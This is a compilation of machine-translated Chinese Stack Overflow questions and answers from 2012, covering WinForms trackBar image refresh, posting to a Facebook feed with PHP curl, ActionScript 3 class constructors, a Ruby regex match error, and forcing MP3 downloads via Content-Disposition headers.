@Html.TextBoxFor(m => m.UserName, new Dictionary<string, object> { { "placeholder", "Login" }, { "data-icon", "user" } }) 
```

# c# - 不停地单击向右箭头键时，如何在 trackBar 滚动中移动图像？

> ID：11603986
> 
> 赞同：1
> 
> 时间：2012-07-22T21:05:52.487
> 
> 标签：c#, winforms

如果我一键单击离开箭头键，然后单击并再次离开，等等图像都变好了。但是，如果我不停地按右箭头键，则只有当我将右箭头键留在它停止的位置时，图像才会改变，以便加载此 trackBar 值中的图像。

这是我的滚动事件：

```
private void trackBar1_Scroll(object sender, EventArgs e)
{   
    currentFrameIndex = trackBar1.Value;
    textBox1.Text = "Frame Number : " + trackBar1.Value;
    wireObject1.woc.Set(wireObjectAnimation1.GetFrame(currentFrameIndex)); 
    LoadPictureAt(trackBar1.Value, sender);

    button1.Enabled = false;
    button2.Enabled = false;
    button3.Enabled = false;
    button4.Enabled = false;
    button8.Enabled = false;
    SaveFormPicutreBoxToBitMapIncludingDrawings();
    return;
} 
```

到目前为止，我还没有 trackBar 的其他事件。

这是 LoadPictureAt 函数：

```
private bool LoadPictureAt(int nIndex, object c)
{
    bool bRet = false;
    if (nIndex >= 0 && nIndex < fi.Length)
    {
        if (c.Equals(trackBar1))
            pictureBox1.Load(fi[nIndex].FullName);
        bRet = true;
    }   
    return bRet;
} 
```

我解决了：

我在滚动事件之前添加了一个新功能：

```
private void setpicture(int indx)
        {
            if (fi == null)
            {

            }
            else
            {
                if (indx >= 0 && indx <= trackBar1.Maximum && fi.Length > indx)
                {
                    try
                    {
                        label19.ForeColor = Color.Red;
                        fileToolStripMenuItem.Enabled = true;
                        label19.Visible = false;
                        label20.Visible = false;
                        label14.Visible = true;
                        label15.Visible = true;
                        label8.Visible = true;
                        label9.Visible = true;

                        trackBar1.Enabled = true;
                        using (FileStream fs = new FileStream(fi[indx].FullName, FileMode.Open))
                        {
                            this.label8.Visible = true;
                            this.label9.Visible = true;
                            this.label9.Text = fi[indx].Name;
                            Image img = null;
                            Bitmap bmp = null;
                            Image imgOLd = null;

                            try
                            {

                                img = Image.FromStream(fs);
                                bmp = new Bitmap(img);

                                imgOLd = this.pictureBox1.Image;
                                this.pictureBox1.Image = bmp;
                                if (imgOLd != null)
                                    imgOLd.Dispose();

                                img.Dispose();
                                img = null;
                            }
                            catch
                            {
                                if (img != null)
                                    img.Dispose();
                                if (bmp != null)
                                    bmp.Dispose();
                                if (imgOLd != null)
                                    imgOLd.Dispose();
                            }
                        }
                    }
                    catch
                    {

                    }
                }
                else
                {
                    Image imgOLd = this.pictureBox1.Image;

                    if (imgOLd != null)
                    {
                        imgOLd.Dispose();
                        imgOLd = null;
                    }

                    Application.DoEvents();
                }
            }
        } 
```

并将滚动事件更改为：

```
private void trackBar1_Scroll(object sender, EventArgs e)
        {

            currentFrameIndex = trackBar1.Value;
            textBox1.Text = "Frame Number : " + trackBar1.Value;
            wireObject1.woc.Set(wireObjectAnimation1.GetFrame(currentFrameIndex)); 

            trackBar1.Minimum = 0;
            trackBar1.Maximum = fi.Length - 1;
            setpicture(trackBar1.Value);
            pictureBox1.Refresh();

            button1.Enabled = false;
            button2.Enabled = false;
            button3.Enabled = false;
            button4.Enabled = false;
            button8.Enabled = false;
            SaveFormPicutreBoxToBitMapIncludingDrawings();
            return;

        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T21:44:40.307

当您按住光标键或尽可能快地反复敲击它时，没有“不间断”之类的东西。它的 KeyDown 事件以现代 CPU 的缓慢速度生成。每秒 20 次点击，每次点击之间间隔 50 毫秒，没有什么比这更好的了。现代内核可以在两次击键之间轻松执行一亿条指令。

然而，重要的是你如何利用这些巨大的资源。不幸的是，你没有做太多，你在 Scroll 事件中碰到了这个磁盘。你调用 Image.Load()，看起来像 Image.Save()。这些方法只能在磁盘旋转时执行，cpu 在等待磁盘完成工作时没有做任何有用的事情。等待机械事件发生的一亿个 cpu 周期被浪费了。

它实际上从那里变得更糟。接下来发生的事情是 Winforms 需要使用从磁盘检索到的图像来绘制窗口。绘画是一个低优先级的操作，只有在没有更重要的事情需要做的时候才会做。

问题是，还有*更*重要的事情需要做。等待磁盘检索/保存图像花费了很长时间，以至于 Winforms 消息循环遇到的下一件事情比绘画*更重要。*一个输入事件，下一次击键。

正确执行后，您的图片框实际上已分配了其图像。你只是看不到它，因为它没有被绘制到屏幕上。停止按光标键和*bam*，它现在有时间和油漆。

这完全是设计使然。您可以通过调用图片框的 Update() 方法*强制*重新绘制，用户现在肯定会看到图像。但这实际上也不是很好，您的程序开始滞后。击键被缓冲在消息队列中，您的程序将在您释放键后很长时间内继续更新图像。

选择你的毒药。

# php - 在我的网站上填写表格后在 Facebook 上发布提要

> ID：11603989
> 
> 赞同：2
> 
> 时间：2012-07-22T21:06:54.103
> 
> 标签：php, facebook, curl, feed

我的网站上有一个新闻表格。创建此新闻消息后，我想在 Facebook 上发布它。我尝试了很多东西，但没有任何效果。这是我的课：

```
<?php

class Facebook {

    const FACEBOOK_APP_ID           = 'MY_APP_ID';

    const FACEBOOK_APP_SECRET       = 'MY_APP_SECRET';

    const FACEBOOK_ACCESS_TOKEN_URI = 'https://graph.facebook.com/oauth/access_token';

    const FACEBOOK_FEED_URI         = 'https://graph.facebook.com/app/feed';

    private function getAccessToken() {
        $params = array(
            'client_id'     => self::FACEBOOK_APP_ID,
            'client_secret' => self::FACEBOOK_APP_SECRET,
            'grant_type'    => 'client_credentials',
        );

        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, self::FACEBOOK_ACCESS_TOKEN_URI);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);

        $data = curl_exec($ch);

        curl_close($ch);

        return substr($data, strpos($data, '=') + 1);
    }

    public function sendFeed() {
        $params =  array(
            'access_token'  => $this->getAccessToken(),
            'message'   => $message,
            'name'      => $name,
            'link'      => $url,
            'description'   => $description,
        );

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, self::FACEBOOK_FEED_URI);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 

        $data = curl_exec($ch);

        curl_close ($ch);

        return $data;
    }

} 
```

如果我调用 sendFeed() 方法，它会返回以下内容：

```
{"id":"404322099626551_404397542952340"} 
```

我认为提交是成功的，但是当我在 facebook 上访问我的页面时，没有新的提要。我究竟做错了什么？我搜索了整整一天，但无法正常工作。我感谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T21:14:29.250

您在这里所做的是将其发布在用户的提要上。您正在使用用户访问令牌。您要使用的是[页面访问令牌](https://developers.facebook.com/docs/authentication/pages/)。

您需要获得代表您的页面执行任务的`manage_pages` [权限。](https://developers.facebook.com/docs/reference/api/permissions/)

另外你应该考虑使用官方的[PHP SDK](https://developers.facebook.com/docs/reference/php/)，它会让访问 Facebook 的 API 更加容易并且提高可读性。

# actionscript-3 - Actionscript 3 类如何工作

> ID：11603993
> 
> 赞同：4
> 
> 时间：2012-07-22T21:07:36.700
> 
> 标签：actionscript-3, class

我需要一点帮助来了解类在 Actionscript 3 中的工作方式。我了解您从“包”开始以及为什么然后导入任何必要的库，然后命名该类并说明它是公共/私有的并扩展任何内容。

在那之后是我不明白的。看来你写“（公共）函数*类名*（）

我不明白你为什么这样做以及大括号中的内容。

我可能错过了一些较早的阅读，因为我已经阅读了一些内容，但似乎无法理解。

有人可以尝试向我解释吗？谢谢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-22T22:45:55.380

## ActionScript 3 类

**`package`声明**。**_**

好的，首先就像您提到的那样，一个类必须由`package`¹包装。这给了我们第一个块，您需要在其中定义类。

```
package
{
    // Your class here.
} 
```

该`package`语句反映了类相对于`.fla`²的位置。例如，如果您在与项目 .fla 相同的目录中有一个文件夹“classes”，那么该文件夹中的类将需要一个反映以下内容的包语句：

```
package classes
{
    // Your class here.
} 
```

**定义类**。

在包*语句中*，您可以插入一个类。不要将此与包本身混淆，包本身可以包含许多类——每个类只需要有自己的文件和相同的包语句。

一个类定义最多由 5 个部分组成：

1.  命名空间。一个类可以是`internal`或`public`。一个`internal`类只能被同一个包中的类看到，而`public`类可以从项目中的任何地方看到。
2.  类名。
3.  基类（可选）。如果定义了基类，那么您的新类将充当该类的扩展，继承基类的所有品质。
4.  要实现的接口（可选）。接口是一个高级主题，因此我建议您暂时忘记这些，直到您的 AS3 和 OOP 发展为止。

如果你想在包中创建一个名为“Person”的类`classes`，那么我们最终会得到：

```
package classes
{
    public class Person
    {
        // Class qualities here.
    }
} 
```

**属性**。

类可以包含属性。属性是使用`var`关键字定义的。它们可能属于多个命名空间之一（包括您自己的），并用于保存属于您的类的值。最常见的属性是在类的顶部聚集在一起。

我们的班级`Person`可以享受以下属性：`height``weight`

```
package classes
{
    public class Person
    {
        // Properties.
        public var height:Number = 1.70;
        public var weight:Number = 67.5;
    }
} 
```

可以通过`Person`您创建的任何实例访问这些属性。每个实例都有自己的一组这些属性。

**类构造函数**（我相信这就是你要问的）。

构造函数用于保存应在创建类实例后立即运行的逻辑。类构造函数与类本身具有相同的名称。它必须是`public`并且它不返回任何东西。构造函数可以接受参数，这些参数通常用于传递对该类的依赖项或所需值的引用。

```
package classes
{
    public class Person
    {
        // Properties.
        public var height:Number = 1.70;
        public var weight:Number = 67.5;

        // Constructor.
        public function Person(height:Number, weight:Number)
        {
            this.height = height;
            this.weight = weight;
        }
    }
} 
```

**方法**。

方法用于保存调用该方法时可以运行的逻辑。方法通常返回值并且可以接受参数。方法可以属于您希望属性能够属于的任何命名空间。

我们可能希望能够轻松确定`Person`我们创建的每个实例的 BMI，因此我们应该为此创建一个方法：

```
package classes
{
    public class Person
    {
        // Properties.
        public var height:Number = 170;
        public var weight:Number = 65.5;

        // Constructor.
        public function Person(height:Number, weight:Number)
        {
            this.height = height;
            this.weight = weight;
        }

        // Determine my BMI and return the result.
        public function getBMI():Number
        {
            return weight / (height * height);
        }
    }
} 
```

**实例**。

现在我们已经定义了我们的新类，我们可以使用`new`关键字创建这个类的实例。这可以从可以访问`Person`该类的任何地方完成，在这种情况下，它是项目中的任何地方，因为我们已经创建了 class `public`。

虽然类是`public`，但从它所属的包之外的任何地方访问它都需要使用`import`语句。该语句需要在属于不同包的任何类中使用。该`import`语句遵循用于 的相同名称，`package`并在末尾包含您要包含的类的名称：

```
import classes.Person; 
```

导入`Person`后，您可以创建它的实例并将它们分配给具有不同`height`和`weight`值的变量：

```
var marty:Person = new Person(71, 1.76);
var bruce:Person = new Person(96.4, 1.72); 
```

`getBMI()`然后，我们可以使用他们的方法获得每个人的 BMI ：

```
trace(marty.getBMI()); // 22.9
trace(bruce.getBMI()); // 32.6 
```

* * *

¹您*可以*将类放在可以在同一个 .as 文件中引用的包之外。
²您可以添加更多源路径，并且包可以相对于该路径。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T22:07:35.870

与类同名的函数是[构造函数](http://ntt.cc/2009/07/14/beginning-actionscript-3-constructor.html)。花括号中基本上是在创建对象时将立即执行的代码的一部分。尝试搜索有关构造函数的信息，我认为它们存在于每种面向对象的编程语言中（我可能错了），所以你有很多资源。

您还可以在[Wikipedia](https://en.wikipedia.org/wiki/Constructor_%28object-oriented_programming%29)上阅读有关此概念的信息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T22:14:01.980

与类同名的函数是构造函数。它是可选的，因此如果您不需要它，可以将其省略。将添加一个默认构造函数，它基本上什么都不做。

构造函数允许您编写在创建类的实例后立即执行的代码（即当另一段代码运行时`new ClassName()`。您通常会使用它来初始化类使用的一些变量。定义构造函数还可以让您处理构造函数参数，其他代码在使用运算符时可以传递的参数`new`。

# ruby - Ruby 正则表达式匹配子表达式的括号

> ID：11603994
> 
> 赞同：0
> 
> 时间：2012-07-22T21:07:42.160
> 
> 标签：ruby, regex, parentheses

我正在尝试使用 ruby​​ 脚本解析一些代码，在某些时候我想通过使用匹配将字符串分成子字符串：

```
frase = "EXTREM(TIME2,FRE,NFRE,SDV,DEL,RMG)"

frase.match(/(\w*)\((.*)\)/)
=> #<MatchData "EXTREM(TIME2,FRE,NFRE,SDV,DEL,RMG)" 1:"EXTREM" 2:"TIME2,FRE,NFRE,SDV,DEL,RMG"> 
```

它在 irb 上按预期工作，但是当我把它放在一个脚本文件中时（在一个名为 procesa 的函数中）：

```
tmpo = extra.match(/(\w*)\s*\((.*)\)/)
puts "#{nombre} calls #{tmpo[1]} with #{tmpo[2]}" 
```

我收到此错误：

```
`block in procesa': undefined method `[]' for nil:NilClass (NoMethodError)
from f2f90.rb:141:in `each_index'
from f2f90.rb:141:in `procesa'
from f2f90.rb:166:in `block in <main>'
from f2f90.rb:166:in `each'
from f2f90.rb:166:in `<main>' 
```

我已经搜索了这个网站和谷歌，但没有运气，我错过了什么吗？，我最终输入了`extra.match(/(\w*)\s*(.*)/)`and ，`tmpo[2].sub("(","").sub(")","")`但我认为这不是最好的方法，我想知道为什么第一个表达式是错误的。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T21:21:38.337

该错误仅意味着没有匹配项。也许如果您`nombre`在运行正则表达式之前打印出来，您可能会看到为什么正则表达式与字符串不匹配。

# html - 有没有办法强制 HTML 在操作系统中打开 mp3？

> ID：11603998
> 
> 赞同：0
> 
> 时间：2012-07-22T21:08:35.217
> 
> 标签：html, cross-browser, operating-system, mp3, client-side

是否有一种跨浏览器的强制方式，例如：

```
<a href = "/mp3s/qwerty.mp3">Click to Listen or Download</a> 
```

...在*操作系统*中打开，而***不是***在浏览器插件（即 Quicktime）中打开？我希望上面的示例链接始终显示操作系统对话框窗口：“ `Open With... Save As...`”。

* * *

这是否可能使用 Javascript 或`ActiveXObject`至少使用 Windows 操作系统？

* * *

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-22T21:13:29.033

您可以通过添加 HTTP 标头来执行此操作

```
Content-Disposition: attachment 
```

当请求 qwerty.mp3 时。如果不知道您使用的是什么 HTTP 服务器，则无法准确告诉您如何操作。

[RFC2183](http://www.ietf.org/rfc/rfc2183.txt)中的详细信息

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T21:13:14.667

没有 100% 万无一失的方法可以做到这一点，因为浏览器总是可以决定最终如何处理这个问题。

但是，大多数想要强制下载的网站都在玩弄标题：使用`Content-disposition: attachment`或发送 mp3 文件`Content-type: application/octet-stream`。这将建议浏览器将文件存储为附件，而不是在内部显示。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-23T03:45:25.497

我没用过。但也许这对你来说是最好的。

[http://www.w3schools.com/html5/html5_audio.asp](http://www.w3schools.com/html5/html5_audio.asp)

又没试过。这是 HTML5。让我们知道你发现什么。